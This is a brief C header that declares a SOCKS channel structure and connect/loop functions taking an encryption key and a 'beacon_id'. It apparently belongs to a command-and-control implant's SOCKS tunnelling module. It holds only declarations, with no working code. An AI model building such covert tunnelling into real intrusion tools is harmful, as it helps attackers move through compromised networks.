#pragma once
#include <stdint.h>
#include "dynapi.h"

#define MAX_SOCKS_CHANNELS 64

typedef struct {
    uint32_t     channel_id;
    SOCKET       remote_sock;
    volatile LONG active;
} socks_channel_t;

int  socks_tcp_connect(const char *host, uint16_t port,
                       const uint8_t *key, uint32_t beacon_id);
void socks_loop(SOCKET sock, const uint8_t *key, uint32_t beacon_id);
